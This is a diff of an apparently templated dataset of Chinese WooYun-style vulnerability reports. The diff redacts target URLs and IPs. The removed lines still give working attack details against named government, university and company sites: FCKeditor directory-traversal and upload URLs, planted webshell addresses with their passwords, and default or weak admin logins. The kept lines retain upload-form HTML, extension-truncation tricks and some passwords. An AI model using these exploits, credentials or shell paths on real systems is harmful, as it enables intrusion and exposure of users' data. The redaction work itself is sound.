+**POC**: 家校互动下有短信功能，试了下：菜刀：https://example.com/[已脱敏]        pass怀疑是学校计算机老师作案，老是收到诈骗升学广告短信等。
 
 **绕过**: 直接利用
 
@@ -2270,7 +2270,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 四川省国家税务局网站(www.sc-n-tax.gov.cn)的网站程序集成了较低版本的FCKeditor编辑器，可以跨目录读取文件，上传任意类型文件等。http://www.sc-n-tax.gov.cn/TaxWeb/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&CurrentFolder=/../../&Type=File
+**详情**: 四川省国家税务局网站(www.sc-n-tax.gov.cn)的网站程序集成了较低版本的FCKeditor编辑器，可以跨目录读取文件，上传任意类型文件等。https://example.com/[已脱敏]
 
 **POC**: 上传JSP脚本获取webshell:
 
@@ -2292,7 +2292,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天看wooyun发现新来的厂商就谷歌了一下。发现一处上传：http://wx.api.dawenmedia.com/wxdw/register/bride然后尝试上传上传截图数据如下：POST /wxdwhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/save HTTP/1.1Host: wx.api.dawenmedia.comProxy-Connection: keep-aliveContent-Length: 195Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://wx.api.dawenmedia.comUser-Agent: Mo
+**详情**: 今天看wooyun发现新来的厂商就谷歌了一下。发现一处上传：https://example.com/[已脱敏] /wxdwhttps://example.com/[已脱敏] HTTP/1.1Host: wx.api.dawenmedia.comProxy-Connection: keep-aliveContent-Length: 195Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mo
 
 **POC**: (见原文)
 
@@ -2314,7 +2314,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度搜索得到后台管理地址：www.whmc.edu.cn/jl_admin/使用弱口令字典可以得到用户名：administrator密码：123456
+**详情**: 某搜索引擎搜索得到后台管理地址：www.whmc.edu.cn/jl_admin/使用弱口令字典可以得到用户名：administrator密码：123456
 
 **POC**: 另外可以上传任意文件。
 
@@ -2358,9 +2358,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一处:http://xuewei.bjmu.edu.cn/idl/idl/ftb.imagegallery.aspxhttp://121.33.246.167/idl30/idl/ftb.imagegallery.aspxhttp://202.115.72.1/idl/idl/ftb.imagegallery.aspxhttp://lib.qfnu.edu.cn:808/idl/ftb.imagegallery.aspxhttp://xwlw.zju.edu.cn/idl/idl/ftb.imagegallery.aspxhttp://papers.libmill.com/idl/ftb.imagegallery.aspx文件名字直接用：;ys.asp;.jpg1.测试http://papers.libmill.com/idl/ftb.imagegallery.aspxhttp://20
+**详情**: 第一处:https://example.com/[已脱敏]
 
-**POC**: 1.测试案例http://xuewei.bjmu.edu.cn/idl/Check/ftb.imagegallery.aspxhttp://xuewei.bjmu.edu.cn/idl/UpLoadimages/mathimages/;ys.asp;.jpg_math.jpg1.测试http://papers.libmill.com/idl/ftb.imagegallery.aspxhttp://202.194.153.155/idl/UpLoadimages/mathimages/;ys.asp;.jpg_math.jpg
+**POC**: 1.测试案例https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2380,9 +2380,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cis.xbwl.cn/login!init.action可以得到webpathhttp://cis.xbwl.cn/www.jsp可上传文件
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://cis.xbwl.cn/wooyun.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2402,9 +2402,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ad.huaweidevice.com/upload.php什么都没过滤 壮哉我大华为！后台密码真是。。你们改一下吧
+**详情**: https://example.com/[已脱敏] 壮哉我大华为！后台密码真是。。你们改一下吧
 
-**POC**: Shell地址http://ad.huaweidevice.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/2014020722125922.Php
+**POC**: Shell地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2424,9 +2424,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 安全生产行政执法监察系统地址：http://220.175.15.105:8080/jiangxiETL/帐号：admin，密码：admin在系统个人资料处，上传照片后，右键照片可以得到一个下载链接http://220.175.15.105:8080/jiangxiETL/accessory.do?method=showImage&path=E:\jboss-4.2.2.GA\server\default\.\deploy\jiangxiETL.war\userImage\admin.jpg构造一下http://220.175.15.105:8080/jiangxiETL/accessory.do?method=showImage&path=E:\jboss-4.2.2.GA\server\default\.\deploy\jiangxiETL.war\WEB-INF\web.xml
+**详情**: 安全生产行政执法监察系统地址：http://[IP已脱敏]
 
-**POC**: 在系统内的投诉举报处存在上传点,可直接上传jsp文件文件上传后的所在的目录为：/accessoryhttp://220.175.15.105:8080/jiangxiETL/accessory/*.jsp一句话地址：http://220.175.15.105:8080/jiangxiETL/accessory/20150420233650288_01.jsp密码：sq0zr
+**POC**: 在系统内的投诉举报处存在上传点,可直接上传jsp文件文件上传后的所在的目录为：/accessoryhttp://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2448,7 +2448,7 @@
 
 **详情**: 
 
-**POC**: 后台地址：http://58.252.61.103/servlet/qdbAction?cmd=start&stylesheet=login.xsl帐号admin 密码：admin
+**POC**: 后台地址：http://[IP已脱敏] 密码：admin
 
 **绕过**: 直接利用
 
@@ -2468,7 +2468,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 爱普生中国在通过电子邮件回复客户工单的时候会附上链接：http://www.epson.com.cn/tech_support/email/user/ufeedback.asp?idcode=【工单编号】1、测试发现如果idcode为空时也会出现客户的工单。根据出现的工单中的电子邮件的统一前、后缀@ecc-sc.com.cn，我个人判断应该都是爱普生公司的内部派单，也许是在数据库中没有录入相应的工单号导致了这个问题。泄漏的工单中附件均可下载，内有发票照片等文件。2、用户提交附件的命名逻辑亦太过简单，采用了日期加四位随机数的方法，如：20120101XXXX，容易被暴力猜解。3、系统还允许用户上传GIF图片，经测试成功asp文件伪造成gif上传成功。
+**详情**: 爱普生中国在通过电子邮件回复客户工单的时候会附上链接：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2490,9 +2490,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,http://wufun.nethttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/head/1437554797291.jsp打开进马儿来几张截图个个硬盘都有权限，权限很大啊，危害也打！求大大通过,TM权6都不通过的，我就醉了
+**详情**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,https://example.com/[已脱敏]
 
-**POC**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,http://wufun.nethttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/head/1437554797291.jsp打开进马儿来几张截图个个硬盘都有权限，权限很大啊，危害也打！求大大通过,TM权6都不通过的，我就醉了
+**POC**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2558,7 +2558,7 @@
 
 **详情**: ..............
 
-**POC**: 第一步  http://www.txzjz.gov.cn/hebca/ 咱先来到这儿   （看上去没什么奇特的地方  一个登陆页面）第二步  注册 我们点击后来到这个地方 http://www.txzjz.gov.cn/hebca/qygl/qyzc.aspx第三步 企业注册 这里比较轻松  例如啊 注册申请码 63227 先记下来第四步 返回 第一步的页面 用注册申请码的 63227 和 密码 222222 登陆第五步 按提示操作 填写单位名称（貌似是在教学怎么注册企业用户  = =! ）附：意外之喜  在企业名称中带着英文上单引号会出现sql报错第六步 保存后点击浏览 选择一个aspx的小
+**POC**: 第一步  https://example.com/[已脱敏] 咱先来到这儿   （看上去没什么奇特的地方  一个登陆页面）第二步  注册 我们点击后来到这个地方 https://example.com/[已脱敏] 企业注册 这里比较轻松  例如啊 注册申请码 63227 先记下来第四步 返回 第一步的页面 用注册申请码的 63227 和 密码 222222 登陆第五步 按提示操作 填写单位名称（貌似是在教学怎么注册企业用户  = =! ）附：意外之喜  在企业名称中带着英文上单引号会出现sql报错第六步 保存后点击浏览 选择一个aspx的小
 
 **绕过**: 直接利用
 
@@ -2578,7 +2578,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.laanhuisafety.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接上传jsp
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2602,7 +2602,7 @@
 
 **详情**: 首先存在查看目录漏洞然后看到了喜闻乐见的upload，点击上传上传没有过滤。。。。。上传后文件为菜刀连接
 
-**POC**: 继续写，上传完以后发现http://fuxue.nankai.edu.cn/commonhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/files/assessment/可以直接浏览。。。。无语了数据库貌似设计05年到14年南开大学学生，还包括部分辅导员。。。。
+**POC**: 继续写，上传完以后发现https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2624,7 +2624,7 @@
 
 **详情**: 先来看看首页吧：
 
-**POC**: S2引起的：执行命令看看吧：http://xlvip.xinglongstore.com/xlvip/login.action
+**POC**: S2引起的：执行命令看看吧：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2732,9 +2732,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在该漏洞的厂商为：长威信息科技发展股份有限公司http://www.evecom.net/长威信息科技发展股份有限公司，是一家全国领先的IT综合服务提供商。长威科技致力于以智慧城市为核心领域的软件研发、解决方案集成及运行维护服务，并已构建起完整的IT服务价值链，为客户提供端到端的IT信息化服务。曾经的那些bug（感谢possible的分析，找了一下午才发现你已经提过了部分..）：WooYun: 福建省国土资源厅任意jsp上传其中修复方案中有指出其拦截代码为evecom.jspcode='|and|set|exec|varchar|insert|select|*|update|delete|chr|master|truncate|char|declare|<|>注意evecom即长威（该站已换厂商了）WooYun: 福建某些局站点任意文件下载案例中的../WEB-INF/web.xml也指
+**详情**: 存在该漏洞的厂商为：长威信息科技发展股份有限公司https://example.com/[已脱敏] 福建省国土资源厅任意jsp上传其中修复方案中有指出其拦截代码为evecom.jspcode='|and|set|exec|varchar|insert|select|*|update|delete|chr|master|truncate|char|declare|<|>注意evecom即长威（该站已换厂商了）WooYun: 福建某些局站点任意文件下载案例中的../WEB-INF/web.xml也指
 
-**POC**: 以厂商主站为例1、上传页面未授权访问，导致文件任意上传、文件任意删除；可以用possible提供的exp，也可以自己抓个包，将realPath=null改为realPath=/，或其它（这里没有设置limit和hold参数，所有文件被重命名为  原文件名+时间戳.jsp）http://www.evecom.net/test20141030085829.jsp通过以下链接可完成文件删除动作，注意realPath的修改http://www.evecom.net/delMoreFile.do?realPath=/&filename=test20141030085829.jsp&notSelect=1
+**POC**: 以厂商主站为例1、上传页面未授权访问，导致文件任意上传、文件任意删除；可以用possible提供的exp，也可以自己抓个包，将realPath=null改为realPath=/，或其它（这里没有设置limit和hold参数，所有文件被重命名为  原文件名+时间戳.jsp）https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2754,9 +2754,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 版权所有?SUNGARD 金仕达 数字化校园基础平台案例：http://xuegong.stiei.edu.cn:9093/ZS/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asphttp://xuegong.stiei.edu.cn:9091/framework/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector
+**详情**: 版权所有?SUNGARD 金仕达 数字化校园基础平台案例：https://example.com/[已脱敏]
 
-**POC**: 案例证明：http://xuegong.stiei.edu.cn:9093/ZS/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp可shell，证明如下：
+**POC**: 案例证明：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2776,7 +2776,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个网站http://jwgl.gxu.edu.cn/存在fck2.6.6上传漏洞http://jwgl.gxu.edu.cn/fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspx
+**详情**: 这个网站https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2800,7 +2800,7 @@
 
 **详情**: 见证明
 
-**POC**: 地址：http://218.202.7.116/login.domysql账户有最高权限，可控制多个数据库管理员密码解密为admin弱口令
+**POC**: 地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2820,7 +2820,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 西安飞扬航运商旅有限公司 http://www.fyair.comJBOSS
+**详情**: 西安飞扬航运商旅有限公司 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2886,9 +2886,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关键词:intitle:网银收费系统百度google搜索即可.下面是给出部分用户列表.222.180.192.243  | 222.180.192.243 |  电信  |  重庆市|202.38.194.47  | 202.38.194.47 |  华南理工大学逸夫楼实验室  |  广东省广州市|218.199.196.90  | 218.199.196.90 |  华中师范大学  |  湖北省武汉市|www.wsjf.sdnu.edu.cn  | 210.44.2.131 |  山东师范大学  |  山东省济南市|wyjf.zjnu.edu.cn  | 210.33.81.6 |  浙江师范大学  |  浙江省杭州市|sfcx.zjnu.edu.cn  | 61.153.34.35 |  浙江师范大学  |  浙江省金华市|wsjf.scuec.edu.cn  | 210.42.144
+**详情**: 关键词:intitle:网银收费系统某搜索引擎google搜索即可.下面是给出部分用户列表.[IP已脱敏]  | [IP已脱敏] |  电信  |  重庆市|[IP已脱敏]  | [IP已脱敏] |  华南理工大学逸夫楼实验室  |  广东省广州市|[IP已脱敏]  | [IP已脱敏] |  华中师范大学  |  湖北省武汉市|www.wsjf.sdnu.edu.cn  | [IP已脱敏] |  山东师范大学  |  山东省济南市|wyjf.zjnu.edu.cn  | [IP已脱敏] |  浙江师范大学  |  浙江省杭州市|sfcx.zjnu.edu.cn  | [IP已脱敏] |  浙江师范大学  |  浙江省金华市|wsjf.scuec.edu.cn  | 210.42.144
 
-**POC**: 1)前台直接getshell.任意文件上传漏洞我们先看看发包的过程.然后,发现此页面前台为授权即可访问到.所以,只要模拟这个发包的过程即可.<html><form action="http://wszf.nwpu.edu.cn/admin/Fileup.aspx?path=notice/" method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>注释:上
+**POC**: 1)前台直接getshell.任意文件上传漏洞我们先看看发包的过程.然后,发现此页面前台为授权即可访问到.所以,只要模拟这个发包的过程即可.<html><form action="https://example.com/[已脱敏]" method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>注释:上
 
 **绕过**: 直接利用
 
@@ -2908,7 +2908,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ahstgt.gov.cn/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2930,7 +2930,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.http://newoa.glsc.com.cn:8082/国联证券预算管理系统爆破出一账号登陆进去员工手机邮箱等等信息全部泄露内部文件办公文件
+**详情**: 1.https://example.com/[已脱敏]
 
 **POC**: 这个系统可直接访问邮箱，默认密码通知有了邮箱，部分系统可找回密码以其中一个系统为例邮件发到邮箱中登陆平台这个平台头像上传还存在任意文件上传，burp改包，可以改上传文件后缀不在深入了
 
@@ -2974,7 +2974,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #0 本OA协同管理系统的客户源http://www.lkpower.com/templates/T_Second/index_150.html国务院港澳办国家体育总局国土资源部土地整理中心中国财政部投资评审中心中国农业科学院北京市教委北京市教工委山西省科学技术厅陕西省核工业地质局江苏省无线电管理局昆明市环境保护局昆明市水利局上海市宝山区公路管理署山东枣庄市工商行政管理局宁波江东区人民政府昆明市滇池管理局陕西人民广播电台沈阳广播电视台路桥集团国际建设股份有限公司中交第三公路工程局有限公司中交第四公路工程局有限公司中国建筑发展有限公司济南四建（集团）有限责任公司河南省宏力集团有限公司中国水电八局溪洛渡施工局北京天润子真建筑装饰有限责任公司北京康成人工环境工程有限公司首都医科大学附属北京安定医院北京中关村医院上海杨浦区疾病预防控制中心江西省人民医院安徽省合肥市第二人民医院无锡市妇幼保健医院徐州
+**详情**: #0 本OA协同管理系统的客户源https://example.com/[已脱敏]
 
 **POC**: #3 SHELL 地址http://222.132.***.***:8080/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg
 
@@ -2996,9 +2996,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: uploadfily组件http://himall.hisense.com/assets/common/uploadify/http://218.58.78.151/new_theme/common/uploadify/http://218.58.78.151/new_theme/common/uploadify/uploadify.php漏洞参考：WooYun: 迈外迪某后台使用第三方组件存在上传漏洞
+**详情**: uploadfily组件https://example.com/[已脱敏] 迈外迪某后台使用第三方组件存在上传漏洞
 
-**POC**: 同样漏洞出现过WooYun: 海信集团某系统弱口令后台任意文件上传http://qr.hisense.com/widget/uploadify/?1&20141107$ pwd/dbdata/virtualHosts/haixin_partner
+**POC**: 同样漏洞出现过WooYun: 海信集团某系统弱口令后台任意文件上传https://example.com/[已脱敏] pwd/dbdata/virtualHosts/haixin_partner
 
 **绕过**: 直接利用
 
@@ -3018,9 +3018,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大思潮是投资促进新思维与解决方案的专业提供机构，十多年来一直为国内各省、市、区县及开发区提供吸引外来投资的决策研究及与投资促进相关的咨询、策划、政策、信息、活动、培训、设计和网络技术等专业服务，并为中外投资者在国内投资，尤其是在京投资提供全方位系列服务。大思潮立足中国投资促进实践，创新思维，以“利他”为行为指导，以“诚实做人，认真做事”为行为规范，着力于推进投资促进事业。十五年中，大思潮用真诚的心，做专业的事，已完成了数百个投资促进领域政府、开发区和投资者的委托项目。官网：http://www.fdip.cn以官网为案例进行演示：系统存在问题的地方在编辑器编辑器路径http://www.fdip.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAnd
+**详情**: 大思潮是投资促进新思维与解决方案的专业提供机构，十多年来一直为国内各省、市、区县及开发区提供吸引外来投资的决策研究及与投资促进相关的咨询、策划、政策、信息、活动、培训、设计和网络技术等专业服务，并为中外投资者在国内投资，尤其是在京投资提供全方位系列服务。大思潮立足中国投资促进实践，创新思维，以“利他”为行为指导，以“诚实做人，认真做事”为行为规范，着力于推进投资促进事业。十五年中，大思潮用真诚的心，做专业的事，已完成了数百个投资促进领域政府、开发区和投资者的委托项目。官网：https://example.com/[已脱敏]
 
-**POC**: 再演示一个北京市投资促进局http://www.investbeijing.gov.cn/http://www.investbeijing.gov.cn//cms//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://www.investbeijing.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type
+**POC**: 再演示一个北京市投资促进局https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3042,7 +3042,7 @@
 
 **详情**: 第三方程序的漏洞.算是0day了.
 
-**POC**: http://razor.zhenai.com/razor 0.6-0.7.1 通用上传漏洞
+**POC**: https://example.com/[已脱敏] 0.6-0.7.1 通用上传漏洞
 
 **绕过**: 直接利用
 
@@ -3062,7 +3062,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 未经认证直接上传文件http://www.lzfg.com.cn/tt/page/attachfile_upload.asp?savepath=E:\bit-service\tt\默认的系统安装路径E:\bit-service\tt\ 或者C:\bit-service\tt\ 或者D:\bit-service\tt\<form id="frmUpload" enctype="multipart/form-data"action="http://110.167.173.115/TT/Page/attachfile_upload.asp?savepath=D:\bit-service\tt\" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpl
+**详情**: 未经认证直接上传文件https://example.com/[已脱敏] 或者C:\bit-service\tt\ 或者D:\bit-service\tt\<form id="frmUpload" enctype="multipart/form-data"action="http://[IP已脱敏] method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpl
 
 **POC**: (见原文)
 
@@ -3084,7 +3084,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://el.homeinns.com/login/index.html随便找了个弱口令登录lsun 123456个人中心任意文件上传，绕过js验证就可以了。
+**详情**: https://example.com/[已脱敏] 123456个人中心任意文件上传，绕过js验证就可以了。
 
 **POC**: 系统root权限，同服务器另一域名
 
@@ -3106,9 +3106,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.beijing.com.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F../../../../../../貌似到顶了
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.beijing.com.cn/2013-04-19-03-17-13930806752.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3152,7 +3152,7 @@
 
 **详情**: 
 
-**POC**: http://ser.foxconn.com/管理员帐号弱密码admin admin后台可任意上传文件，无任何限制,成功上传shell成功获得管理员权限.厂商记得删除掉shell。
+**POC**: https://example.com/[已脱敏] admin后台可任意上传文件，无任何限制,成功上传shell成功获得管理员权限.厂商记得删除掉shell。
 
 **绕过**: 直接利用
 
@@ -3172,9 +3172,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 密码 chopperhttp://hzjj.hzga.gov.cn/Web/Files/Bgxz/aspx_20150616195734.aspxhttp://bjjj.baoji.gov.cn/web/Files/Bgxz/aspx_20150616194928.aspx
+**详情**: 密码 chopperhttps://example.com/[已脱敏]
 
-**POC**: http://bjjj.baoji.gov.cn/Web/admin/文件访问权限http://bjjj.baoji.gov.cn/Web/admin/Bgxz/TableEdit.aspx 找到文件上传查看文件http://bjjj.baoji.gov.cn/Web/admin/Bgxz/TableList.aspx一句话木马上传同理得到密码 chopperhttp://hzjj.hzga.gov.cn/Web/Files/Bgxz/aspx_20150616195734.aspxhttp://bjjj.baoji.gov.cn/web/Files/Bgxz/aspx_20150616194
+**POC**: https://example.com/[已脱敏] 找到文件上传查看文件https://example.com/[已脱敏] chopperhttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3194,7 +3194,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、整理书签的时候发现了这个站，收藏他的初衷已经不记得了，但肯定有故事。2、看到是ASPX的脑海中闪现的第一个单词就是fckeditor,果然心诚则灵。http://swgk.impcas.ac.cn/fckeditor/editor/filemanager/connectors/test.html
+**详情**: 1、整理书签的时候发现了这个站，收藏他的初衷已经不记得了，但肯定有故事。2、看到是ASPX的脑海中闪现的第一个单词就是fckeditor,果然心诚则灵。https://example.com/[已脱敏]
 
 **POC**: 里面的webshell已经一大堆了。话说喜欢用image.asp;.jpg的大牛，我们好像在哪见过。然后挂了很多的链。点到为止，就不去作死了。
 
@@ -3216,9 +3216,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录地址:http://ktshop.tcl.com/web/tclkt/login.jsp帐号:t54728密码:123456上万订单信息泄露,上亿交易额,客户手机,地址,部分银行卡号等信息...可以审核付款信息,也就是等于变相免费冲值,修改订单信息...任意文件上传,没找到路径...
+**详情**: 登录地址:https://example.com/[已脱敏]
 
-**POC**: 登录地址:http://ktshop.tcl.com/web/tclkt/login.jsp帐号:t54728密码:123456上万订单信息泄露,上亿交易额,客户手机,地址,部分银行卡号等信息...可以审核付款信息,也就是等于变相免费冲值,修改订单信息...任意文件上传,没找到路径...
+**POC**: 登录地址:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3238,9 +3238,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 认证采用了先载入，然后JS跳转的机制。提交内容也没有进行权限验证.禁用浏览器JS可直接访问后台页面。其中可直接传马的页面：http://sgdaj.shaoguan.gov.cn/photo_admin.asp其他越权页面：
+**详情**: 认证采用了先载入，然后JS跳转的机制。提交内容也没有进行权限验证.禁用浏览器JS可直接访问后台页面。其中可直接传马的页面：https://example.com/[已脱敏]
 
-**POC**: Shell地址：http://sgdaj.shaoguan.gov.cn/uploadimg/1.asp数据库(及备份)不少，还有ORACLE的连了下MSSQL:
+**POC**: Shell地址：https://example.com/[已脱敏])不少，还有ORACLE的连了下MSSQL:
 
 **绕过**: 直接利用
 
@@ -3262,7 +3262,7 @@
 
 **详情**: 形象照那
 
-**POC**: http://photograph.baihe.com/photograph/tp//2013/04/01/D9850963BA8EFCFD814FFADD1FB32973.jsp!!!!
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3282,9 +3282,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度文库https://vpn.just.edu.cn/dana/home/index.cgiA30000 A30000 进行登录https://vpn.just.edu.cn/Teacher/Admin/,DanaInfo=192.168.11.53+TeacherManager.aspxadmin admin 进行登录https://vpn.just.edu.cn/jasinda/newteacher/,DanaInfo=192.168.11.52+index.jspa01788 a01788进登录也可以进行文件上传，并没尝试
+**详情**: 某搜索引擎文库https://example.com/[已脱敏] A30000 进行登录https://example.com/[已脱敏] admin 进行登录https://example.com/[已脱敏] a01788进登录也可以进行文件上传，并没尝试
 
-**POC**: 百度文库https://vpn.just.edu.cn/dana/home/index.cgiA30000 A30000 进行登录https://vpn.just.edu.cn/Teacher/Admin/,DanaInfo=192.168.11.53+TeacherManager.aspxadmin admin 进行登录https://vpn.just.edu.cn/jasinda/newteacher/,DanaInfo=192.168.11.52+index.jspa01788 a01788进登录也可以进行文件上传，并没尝试
+**POC**: 某搜索引擎文库https://example.com/[已脱敏] A30000 进行登录https://example.com/[已脱敏] admin 进行登录https://example.com/[已脱敏] a01788进登录也可以进行文件上传，并没尝试
 
 **绕过**: 直接利用
 
@@ -3304,7 +3304,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://219.142.122.150:81聊天窗口有个图片上传功能，仅仅是前段验证，很容突破上传。如图：同服有6、7个站点。数据库账户密码：而且全盘浏览，权限很大、没深入。
+**详情**: URL：http://[IP已脱敏]聊天窗口有个图片上传功能，仅仅是前段验证，很容突破上传。如图：同服有6、7个站点。数据库账户密码：而且全盘浏览，权限很大、没深入。
 
 **POC**: (见原文)
 
@@ -3326,9 +3326,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题系统：http://www.itophome.com/海尔e家联盟被波及系统：同服站点http://marketing.haieruhome.com/海尔终端执行力系统安全，不是指你强大的在哪里，而是说你薄弱的地方在哪里。http://marketing.haieruhome.com/wooyun.txthttp://www.itophome.com/uploadfiles/1.aspxhttp://www.itophome.com/uploadfiles/ht.aspx这三个文件请删除。http://www.itophome.com存在fck编辑器上传漏洞。<form id="frmUpload" method="post" target="_blank" enctype="multipart/form-data" action="http://www.itophome.com/fc
+**详情**: 问题系统：https://example.com/[已脱敏] id="frmUpload" method="post" target="_blank" enctype="multipart/form-data" action="https://example.com/[已脱敏]
 
-**POC**: 见详细说明。http://marketing.haieruhome.com/wooyun.txthttp://www.itophome.com/uploadfiles/1.aspxhttp://www.itophome.com/uploadfiles/ht.aspx
+**POC**: 见详细说明。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3350,7 +3350,7 @@
 
 **详情**: 可上传文件！
 
-**POC**: http://www.tudou.com/fckeditor/editor/fckeditor.html
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3370,7 +3370,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞：http://www.international.hit.edu.cn/test/上传图片马 xx.asp;.jpg上菜刀，搞定~
+**详情**: 漏洞：https://example.com/[已脱敏] xx.asp;.jpg上菜刀，搞定~
 
 **POC**: 上面说完了
 
@@ -3392,7 +3392,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登陆了官方演示地址看了一下http://e.edayshop.com/xt/ys/EDSC006/admins/index.asp就发现了一个很熟悉的上传连接http://e.edayshop.com/xt/ys/EDSC006/admins/upload_flash.asp?formname=bd&editname=tp&uppath=../tp&filelx=jpg此处过滤不严，可修改uppath上传路径，通过1.asa%00截断，上传任意文件任意文件名。
+**详情**: 登陆了官方演示地址看了一下https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
